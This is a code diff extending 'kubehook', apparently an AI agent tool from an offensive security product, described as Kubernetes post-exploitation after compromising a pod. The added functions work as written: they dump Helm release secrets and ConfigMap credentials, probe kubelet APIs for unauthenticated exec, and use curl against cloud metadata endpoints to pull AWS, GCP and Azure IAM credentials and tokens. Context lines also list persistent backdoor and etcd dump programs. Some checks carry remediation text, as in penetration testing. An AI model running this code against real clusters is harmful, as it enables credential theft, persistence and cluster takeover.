@@ -32,6 +32,36 @@ const PROGRAMS = {
       "Deploy persistent backdoor via DaemonSet (runs on every node) or CronJob (periodic callback) with configurable image and callback URL",
     args: "--type <daemonset|cronjob> --image IMAGE [--callback-url URL] [--namespace NS] [--kubeconfig PATH] [--context CTX]",
   },
+  k8s_rbac_audit: {
+    description:
+      "Deep RBAC analysis: find roles with dangerous verbs (create pods, exec, get secrets, escalate, bind, impersonate), wildcard resources/verbs, and overprivileged service accounts",
+    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
+  },
+  k8s_network_policy: {
+    description:
+      "Audit NetworkPolicies: find namespaces with no policies (all traffic allowed), pods not selected by any policy, and overly permissive allow-all rules",
+    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
+  },
+  helm_secrets: {
+    description:
+      "Extract secrets from Helm releases stored as Kubernetes secrets (type helm.sh/release.v1). Decodes release data and scans values for credentials",
+    args: "[--namespace NS] [--release NAME] [--kubeconfig PATH] [--context CTX]",
+  },
+  kubelet_api: {
+    description:
+      "Probe kubelet API on port 10250 (authenticated) and 10255 (read-only). Enumerates pods, checks for unauthenticated exec access",
+    args: "--target HOST [--port PORT]",
+  },
+  cloud_metadata: {
+    description:
+      "Access cloud provider metadata service from within a pod. Extracts IAM credentials, instance identity, and project info from AWS/GCP/Azure IMDS",
+    args: "[--provider aws|gcp|azure|all]",
+  },
+  k8s_configmap: {
+    description:
+      "Dump ConfigMaps across namespaces and scan for connection strings, API endpoints, database URLs, and plaintext credentials",
+    args: "[--namespace NS] [--kubeconfig PATH] [--context CTX]",
+  },
   cleanup_k8s: {
     description:
       "Remove all CyberStrike-created Kubernetes resources (by label app=cyberstrike): DaemonSets, CronJobs, ClusterRoleBindings, Pods. ALWAYS run before leaving",
@@ -546,6 +576,514 @@ async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult>
   return { output: output.join("\n"), findings: [] }
 }
 
+async function k8sRbacAudit(args: string[], timeout: number): Promise<HookResult> {
+  const kubeconfig = argVal(args, "--kubeconfig")
+  const ctx = argVal(args, "--context")
+  const ns = argVal(args, "--namespace")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Auditing Kubernetes RBAC...\n"]
+
+  const dangerousVerbs = ["create", "update", "patch", "delete", "escalate", "bind", "impersonate"]
+  const sensitiveResources = ["secrets", "pods/exec", "pods/attach", "serviceaccounts/token", "clusterroles", "clusterrolebindings"]
+
+  const clusterRoles = await kc(["get", "clusterroles"], kubeconfig, ctx, timeout)
+  if (clusterRoles.exitCode === 0) {
+    const items = tryJson(clusterRoles.stdout)?.items || []
+    output.push(`[+] ClusterRoles: ${items.length}\n`)
+    for (const role of items) {
+      if (role.metadata.name.startsWith("system:")) continue
+      const rules = role.rules || []
+      for (const rule of rules) {
+        const verbs = rule.verbs || []
+        const resources = rule.resources || []
+        const apiGroups = rule.apiGroups || []
+        if (verbs.includes("*") && resources.includes("*")) {
+          output.push(`  [!] ${role.metadata.name}: wildcard verbs+resources (cluster-admin equivalent)`)
+          findings.push({
+            checkId: "K8S-RBAC-001",
+            provider: "kubernetes",
+            severity: "critical",
+            status: "FAIL",
+            resource: `ClusterRole/${role.metadata.name}`,
+            title: `Wildcard ClusterRole: ${role.metadata.name}`,
+            details: `apiGroups: ${apiGroups.join(",")}, resources: *, verbs: *`,
+            remediation: "Replace wildcards with specific resources and verbs",
+          })
+          continue
+        }
+        const dangerous = verbs.filter((v: string) => dangerousVerbs.includes(v))
+        const sensitive = resources.filter((r: string) => sensitiveResources.includes(r))
+        if (dangerous.length > 0 && sensitive.length > 0) {
+          output.push(`  [!] ${role.metadata.name}: ${dangerous.join(",")} on ${sensitive.join(",")}`)
+          findings.push({
+            checkId: "K8S-RBAC-002",
+            provider: "kubernetes",
+            severity: "high",
+            status: "FAIL",
+            resource: `ClusterRole/${role.metadata.name}`,
+            title: `Dangerous permissions: ${role.metadata.name}`,
+            details: `Verbs: ${dangerous.join(",")}, Resources: ${sensitive.join(",")}`,
+            remediation: "Follow least privilege — restrict dangerous verbs on sensitive resources",
+          })
+        }
+      }
+    }
+  }
+
+  const scope = ns ? [ns] : ["default"]
+  if (!ns) {
+    const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
+    if (nsResult.exitCode === 0) {
+      const items = tryJson(nsResult.stdout)?.items || []
+      scope.length = 0
+      scope.push(...items.map((n: Record<string, Record<string, string>>) => n.metadata.name))
+    }
+  }
+
+  for (const n of scope) {
+    const roles = await kc(["get", "roles", "-n", n], kubeconfig, ctx, timeout)
+    if (roles.exitCode !== 0) continue
+    const items = tryJson(roles.stdout)?.items || []
+    for (const role of items) {
+      const rules = role.rules || []
+      for (const rule of rules) {
+        if ((rule.verbs || []).includes("*") && (rule.resources || []).includes("*")) {
+          output.push(`  [!] ${n}/Role/${role.metadata.name}: wildcard permissions`)
+          findings.push({
+            checkId: "K8S-RBAC-001",
+            provider: "kubernetes",
+            severity: "high",
+            status: "FAIL",
+            resource: `${n}/Role/${role.metadata.name}`,
+            title: `Wildcard Role in ${n}: ${role.metadata.name}`,
+            details: `Role has * verbs on * resources in namespace ${n}`,
+            remediation: "Scope to specific resources and verbs",
+          })
+        }
+      }
+    }
+  }
+
+  output.push(`\n[*] RBAC audit complete: ${findings.length} issue(s) found`)
+  return { output: output.join("\n"), findings }
+}
+
+async function k8sNetworkPolicy(args: string[], timeout: number): Promise<HookResult> {
+  const kubeconfig = argVal(args, "--kubeconfig")
+  const ctx = argVal(args, "--context")
+  const ns = argVal(args, "--namespace")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Auditing Kubernetes NetworkPolicies...\n"]
+
+  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
+  const namespaces = ns
+    ? [ns]
+    : nsResult.exitCode === 0
+      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
+      : ["default"]
+
+  for (const n of namespaces) {
+    const policies = await kc(["get", "networkpolicies", "-n", n], kubeconfig, ctx, timeout)
+    const items = policies.exitCode === 0 ? (tryJson(policies.stdout)?.items || []) : []
+
+    if (items.length === 0) {
+      output.push(`  [!] ${n}: NO NetworkPolicies — all pod-to-pod traffic allowed`)
+      findings.push({
+        checkId: "K8S-NETPOL-001",
+        provider: "kubernetes",
+        severity: "high",
+        status: "FAIL",
+        resource: `namespace/${n}`,
+        title: `No NetworkPolicies in namespace: ${n}`,
+        details: `All ingress/egress traffic is permitted between pods`,
+        remediation: "Create default-deny NetworkPolicy and whitelist required traffic",
+      })
+      continue
+    }
+
+    output.push(`  ${n}: ${items.length} NetworkPolicy(ies)`)
+    for (const pol of items) {
+      const spec = pol.spec || {}
+      const ingress = spec.ingress || []
+      const egress = spec.egress || []
+
+      if (ingress.length === 1 && Object.keys(ingress[0]).length === 0) {
+        output.push(`    [!] ${pol.metadata.name}: allows ALL ingress`)
+        findings.push({
+          checkId: "K8S-NETPOL-002",
+          provider: "kubernetes",
+          severity: "medium",
+          status: "FAIL",
+          resource: `${n}/NetworkPolicy/${pol.metadata.name}`,
+          title: `Allow-all ingress: ${pol.metadata.name}`,
+          details: `Policy has empty ingress rule = allow all`,
+          remediation: "Restrict ingress to specific pod selectors or CIDR blocks",
+        })
+      }
+      if (egress.length === 1 && Object.keys(egress[0]).length === 0) {
+        output.push(`    [!] ${pol.metadata.name}: allows ALL egress`)
+      }
+
+      const selector = spec.podSelector?.matchLabels || {}
+      if (Object.keys(selector).length === 0 && !spec.podSelector?.matchExpressions) {
+        output.push(`    ${pol.metadata.name}: applies to ALL pods in ${n}`)
+      }
+    }
+  }
+
+  output.push(`\n[*] Network policy audit complete: ${findings.length} issue(s)`)
+  return { output: output.join("\n"), findings }
+}
+
+async function helmSecrets(args: string[], timeout: number): Promise<HookResult> {
+  const kubeconfig = argVal(args, "--kubeconfig")
+  const ctx = argVal(args, "--context")
+  const ns = argVal(args, "--namespace")
+  const release = argVal(args, "--release")
+  const output: string[] = ["[*] Extracting Helm release secrets...\n"]
+  const findings: Finding[] = []
+
+  const secretPattern =
+    /(?:password|secret|api[_-]?key|token|credential|private[_-]?key|database[_-]?url|connection[_-]?string)/i
+
+  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
+  const namespaces = ns
+    ? [ns]
+    : nsResult.exitCode === 0
+      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
+      : ["default"]
+
+  let total = 0
+  for (const n of namespaces) {
+    const filter = release ? `-l name=${release}` : ""
+    const secrets = await kc(
+      ["get", "secrets", "-n", n, "--field-selector", "type=helm.sh/release.v1", ...(filter ? [filter] : [])],
+      kubeconfig,
+      ctx,
+      timeout,
+    )
+    if (secrets.exitCode !== 0) continue
+    const items = tryJson(secrets.stdout)?.items || []
+    if (items.length === 0) continue
+
+    output.push(`\n[+] ${n}: ${items.length} Helm release(s)`)
+    for (const s of items) {
+      total++
+      const releaseName = s.metadata.labels?.name || s.metadata.name
+      const version = s.metadata.labels?.version || "?"
+      output.push(`\n  Release: ${releaseName} (v${version})`)
+
+      const releaseData = s.data?.release
+      if (!releaseData) continue
+
+      const decoded = Buffer.from(String(releaseData), "base64").toString("utf-8")
+      let decompressed = decoded
+      try {
+        const buf = Buffer.from(decoded, "base64")
+        const ds = new DecompressionStream("gzip")
+        const writer = ds.writable.getWriter()
+        writer.write(buf)
+        writer.close()
+        const reader = ds.readable.getReader()
+        const chunks: Uint8Array[] = []
+        let chunk = await reader.read()
+        while (!chunk.done) {
+          chunks.push(chunk.value)
+          chunk = await reader.read()
+        }
+        decompressed = Buffer.concat(chunks).toString("utf-8")
+      } catch {
+        // not gzipped, use decoded directly
+      }
+
+      const releaseObj = tryJson(decompressed)
+      if (!releaseObj) continue
+
+      const config = releaseObj.config || {}
+      const configStr = JSON.stringify(config, null, 2)
+      const configLines = configStr.split("\n")
+      for (const line of configLines) {
+        if (secretPattern.test(line)) {
+          output.push(`    [!] ${line.trim().substring(0, 150)}`)
+          findings.push({
+            checkId: "K8S-HELM-001",
+            provider: "kubernetes",
+            severity: "high",
+            status: "EXTRACTED",
+            resource: `${n}/helm/${releaseName}`,
+            title: `Secret in Helm values: ${releaseName}`,
+            details: line.trim().substring(0, 300),
+            remediation: "Use external secrets or sealed-secrets instead of plaintext Helm values",
+          })
+        }
+      }
+    }
+  }
+
+  output.push(`\n[*] Total Helm releases scanned: ${total}`)
+  return { output: output.join("\n"), findings }
+}
+
+async function kubeletApi(args: string[], timeout: number): Promise<HookResult> {
+  const target = argVal(args, "--target")
+  const port = argVal(args, "--port")
+  const findings: Finding[] = []
+  const output: string[] = []
+
+  if (!target) return { output: "[!] Required: --target HOST", findings }
+
+  const ports = port ? [port] : ["10250", "10255"]
+
+  for (const p of ports) {
+    const scheme = p === "10255" ? "http" : "https"
+    const base = `${scheme}://${target}:${p}`
+    output.push(`[*] Probing kubelet API at ${base}...\n`)
+
+    if (p === "10255") {
+      const pods = await run("curl", ["-s", "--max-time", "5", `${base}/pods`], timeout)
+      if (pods.exitCode === 0 && pods.stdout.includes('"items"')) {
+        const data = tryJson(pods.stdout)
+        const items = data?.items || []
+        output.push(`[+] Kubelet read-only API OPEN on ${target}:${p}!`)
+        output.push(`    Pods: ${items.length}`)
+        for (const pod of items.slice(0, 10)) {
+          output.push(`    ${pod.metadata?.namespace}/${pod.metadata?.name} (${pod.status?.phase})`)
+        }
+        findings.push({
+          checkId: "K8S-KUBELET-001",
+          provider: "kubernetes",
+          severity: "high",
+          status: "FAIL",
+          resource: `kubelet://${target}:${p}`,
+          title: `Kubelet read-only API exposed: ${target}:${p}`,
+          details: `${items.length} pod(s) accessible without authentication`,
+          remediation: "Disable read-only port (--read-only-port=0)",
+        })
+      }
+      continue
+    }
+
+    const pods = await run("curl", ["-sk", "--max-time", "5", `${base}/pods`], timeout)
+    if (pods.exitCode === 0 && pods.stdout.includes('"items"')) {
+      const data = tryJson(pods.stdout)
+      const items = data?.items || []
+      output.push(`[+] Kubelet API accessible without client cert on ${target}:${p}!`)
+      output.push(`    Pods: ${items.length}`)
+      findings.push({
+        checkId: "K8S-KUBELET-002",
+        provider: "kubernetes",
+        severity: "critical",
+        status: "FAIL",
+        resource: `kubelet://${target}:${p}`,
+        title: `Kubelet API unauthenticated: ${target}:${p}`,
+        details: `Full kubelet API including exec/run accessible — can execute commands in any pod`,
+        remediation: "Enable kubelet authentication (--authentication-token-webhook=true)",
+      })
+
+      const running = await run("curl", ["-sk", "--max-time", "5", `${base}/runningpods/`], timeout)
+      if (running.exitCode === 0) {
+        const runData = tryJson(running.stdout)
+        const runItems = runData?.items || []
+        output.push(`    Running pods: ${runItems.length}`)
+        for (const pod of runItems.slice(0, 10)) {
+          const containers = (pod.spec?.containers || []).map((c: Record<string, string>) => c.name)
+          output.push(`      ${pod.metadata?.namespace}/${pod.metadata?.name} — ${containers.join(",")}`)
+        }
+      }
+    }
+    if (pods.exitCode !== 0 || pods.stdout.includes("Forbidden") || pods.stdout.includes("Unauthorized")) {
+      output.push(`[-] Kubelet API on ${target}:${p} requires authentication (good)`)
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function cloudMetadata(_args: string[], timeout: number): Promise<HookResult> {
+  const provider = argVal(_args, "--provider") || "all"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Probing cloud metadata services from pod...\n"]
+
+  if (provider === "aws" || provider === "all") {
+    output.push("\n── AWS IMDS ──")
+    const tokenReq = await run(
+      "curl",
+      ["-s", "--max-time", "3", "-X", "PUT", "-H", "X-aws-ec2-metadata-token-ttl-seconds: 60", "http://169.254.169.254/latest/api/token"],
+      timeout,
+    )
+    const token = tokenReq.exitCode === 0 ? tokenReq.stdout.trim() : ""
+    const headers = token ? ["-H", `X-aws-ec2-metadata-token: ${token}`] : []
+
+    const identity = await run("curl", ["-s", "--max-time", "3", ...headers, "http://169.254.169.254/latest/meta-data/iam/info"], timeout)
+    if (identity.exitCode === 0 && identity.stdout.includes("InstanceProfileArn")) {
+      const info = tryJson(identity.stdout)
+      output.push(`[+] AWS IMDS accessible! IAM Role: ${info?.InstanceProfileArn || "unknown"}`)
+
+      const creds = await run(
+        "curl",
+        ["-s", "--max-time", "3", ...headers, "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
+        timeout,
+      )
+      if (creds.exitCode === 0 && creds.stdout.trim()) {
+        const roleName = creds.stdout.trim().split("\n")[0]
+        const roleCredReq = await run(
+          "curl",
+          ["-s", "--max-time", "3", ...headers, `http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`],
+          timeout,
+        )
+        if (roleCredReq.exitCode === 0) {
+          const rc = tryJson(roleCredReq.stdout)
+          if (rc?.AccessKeyId) {
+            output.push(`    AccessKeyId: ${rc.AccessKeyId}`)
+            output.push(`    SecretAccessKey: ${rc.SecretAccessKey?.substring(0, 10)}...`)
+            output.push(`    Token: ${rc.Token?.substring(0, 20)}...`)
+            output.push(`    Expiration: ${rc.Expiration}`)
+          }
+        }
+      }
+      findings.push({
+        checkId: "K8S-META-001",
+        provider: "kubernetes",
+        severity: "critical",
+        status: "FAIL",
+        resource: "imds://169.254.169.254",
+        title: "AWS IMDS accessible from pod",
+        details: `IAM Role: ${info?.InstanceProfileArn || "unknown"}`,
+        remediation: "Use IRSA (IAM Roles for Service Accounts) and block IMDS with NetworkPolicy",
+      })
+    }
+    if (identity.exitCode !== 0) output.push("[-] AWS IMDS not accessible")
+  }
+
+  if (provider === "gcp" || provider === "all") {
+    output.push("\n── GCP Metadata ──")
+    const meta = await run(
+      "curl",
+      ["-s", "--max-time", "3", "-H", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"],
+      timeout,
+    )
+    if (meta.exitCode === 0 && meta.stdout.includes("@")) {
+      output.push(`[+] GCP Metadata accessible! SA: ${meta.stdout.trim()}`)
+      const token = await run(
+        "curl",
+        ["-s", "--max-time", "3", "-H", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"],
+        timeout,
+      )
+      if (token.exitCode === 0) {
+        const t = tryJson(token.stdout)
+        if (t?.access_token) output.push(`    Token: ${t.access_token.substring(0, 20)}... (expires in ${t.expires_in}s)`)
+      }
+      findings.push({
+        checkId: "K8S-META-001",
+        provider: "kubernetes",
+        severity: "critical",
+        status: "FAIL",
+        resource: "imds://metadata.google.internal",
+        title: "GCP metadata accessible from pod",
+        details: `Service Account: ${meta.stdout.trim()}`,
+        remediation: "Use Workload Identity and block metadata with NetworkPolicy",
+      })
+    }
+    if (meta.exitCode !== 0) output.push("[-] GCP metadata not accessible")
+  }
+
+  if (provider === "azure" || provider === "all") {
+    output.push("\n── Azure IMDS ──")
+    const meta = await run(
+      "curl",
+      ["-s", "--max-time", "3", "-H", "Metadata: true", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"],
+      timeout,
+    )
+    if (meta.exitCode === 0 && meta.stdout.includes("vmId")) {
+      const d = tryJson(meta.stdout)
+      output.push(`[+] Azure IMDS accessible!`)
+      if (d?.compute) output.push(`    VM: ${d.compute.name}, RG: ${d.compute.resourceGroupName}`)
+
+      const token = await run(
+        "curl",
+        ["-s", "--max-time", "3", "-H", "Metadata: true", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"],
+        timeout,
+      )
+      if (token.exitCode === 0) {
+        const t = tryJson(token.stdout)
+        if (t?.access_token) output.push(`    Token: ${t.access_token.substring(0, 20)}...`)
+      }
+      findings.push({
+        checkId: "K8S-META-001",
+        provider: "kubernetes",
+        severity: "critical",
+        status: "FAIL",
+        resource: "imds://169.254.169.254",
+        title: "Azure IMDS accessible from pod",
+        details: `VM: ${d?.compute?.name || "unknown"}`,
+        remediation: "Use Azure AD Workload Identity and block IMDS",
+      })
+    }
+    if (meta.exitCode !== 0) output.push("[-] Azure IMDS not accessible")
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+async function k8sConfigmap(args: string[], timeout: number): Promise<HookResult> {
+  const kubeconfig = argVal(args, "--kubeconfig")
+  const ctx = argVal(args, "--context")
+  const ns = argVal(args, "--namespace")
+  const output: string[] = ["[*] Dumping Kubernetes ConfigMaps...\n"]
+  const findings: Finding[] = []
+
+  const secretPattern =
+    /(?:password|secret|api[_-]?key|token|credential|private[_-]?key|database[_-]?url|connection[_-]?string|redis|mysql|postgres|mongo|amqp)/i
+
+  const nsResult = await kc(["get", "namespaces"], kubeconfig, ctx, timeout)
+  const namespaces = ns
+    ? [ns]
+    : nsResult.exitCode === 0
+      ? (tryJson(nsResult.stdout)?.items || []).map((n: Record<string, Record<string, string>>) => n.metadata.name)
+      : ["default"]
+
+  let total = 0
+  for (const n of namespaces) {
+    const cms = await kc(["get", "configmaps", "-n", n], kubeconfig, ctx, timeout)
+    if (cms.exitCode !== 0) continue
+    const items = tryJson(cms.stdout)?.items || []
+    if (items.length === 0) continue
+
+    for (const cm of items) {
+      if (cm.metadata.name.startsWith("kube-")) continue
+      const data = cm.data || {}
+      const keys = Object.keys(data)
+      if (keys.length === 0) continue
+      total++
+
+      let hasSecret = false
+      for (const [key, val] of Object.entries(data)) {
+        const value = String(val)
+        if (secretPattern.test(key) || secretPattern.test(value)) {
+          if (!hasSecret) {
+            output.push(`\n[+] ${n}/${cm.metadata.name}`)
+            hasSecret = true
+          }
+          output.push(`    [!] ${key}: ${value.substring(0, 150)}`)
+          findings.push({
+            checkId: "K8S-CM-001",
+            provider: "kubernetes",
+            severity: "high",
+            status: "EXTRACTED",
+            resource: `${n}/ConfigMap/${cm.metadata.name}`,
+            title: `Credential in ConfigMap: ${cm.metadata.name}/${key}`,
+            details: `${key}: ${value.substring(0, 200)}`,
+            remediation: "Move credentials to Kubernetes Secrets or external secret management",
+          })
+        }
+      }
+    }
+  }
+
+  output.push(`\n[*] Total ConfigMaps scanned: ${total}, issues: ${findings.length}`)
+  return { output: output.join("\n"), findings }
+}
+
 async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> {
   const kubeconfig = argVal(args, "--kubeconfig")
   const ctx = argVal(args, "--context")
@@ -623,7 +1161,7 @@ async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> 
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
 
 export const KubehookTool = Tool.define("kubehook", {
-  description: `Execute a Kubernetes post-exploitation program after compromising a pod or obtaining kubeconfig. Uses kubectl CLI (no Python/SDK dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_k8s before leaving a target.`,
+  description: `Execute a Kubernetes post-exploitation program. 13 programs: cluster enum, secrets/configmap extraction, escape detection, RBAC audit, network policy gaps, Helm secrets, kubelet API probing, cloud metadata IMDS, privesc, backdoor, etcd dump. Available: ${programKeys.join(", ")}. ALWAYS run cleanup_k8s before leaving.`,
   parameters: z.object({
     program: z.enum(programKeys).describe(
       "Kubernetes program to execute. Options: " +
@@ -635,7 +1173,7 @@ export const KubehookTool = Tool.define("kubehook", {
     timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
   }),
   async execute(params) {
-    if (!Bun.which("kubectl")) {
+    if (!Bun.which("kubectl") && !["kubelet_api", "cloud_metadata"].includes(params.program)) {
       return {
         title: `kubehook: ${params.program}`,
         output: "kubectl not found. Install: https://kubernetes.io/docs/tasks/tools/",
@@ -650,6 +1188,12 @@ export const KubehookTool = Tool.define("kubehook", {
       k8s_privesc: () => k8sPrivesc(params.args, params.timeout_seconds),
       etcd_dump: () => etcdDump(params.args, params.timeout_seconds),
       k8s_backdoor: () => k8sBackdoor(params.args, params.timeout_seconds),
+      k8s_rbac_audit: () => k8sRbacAudit(params.args, params.timeout_seconds),
+      k8s_network_policy: () => k8sNetworkPolicy(params.args, params.timeout_seconds),
+      helm_secrets: () => helmSecrets(params.args, params.timeout_seconds),
+      kubelet_api: () => kubeletApi(params.args, params.timeout_seconds),
+      cloud_metadata: () => cloudMetadata(params.args, params.timeout_seconds),
+      k8s_configmap: () => k8sConfigmap(params.args, params.timeout_seconds),
       cleanup_k8s: () => cleanupK8s(params.args, params.timeout_seconds),
     }
 
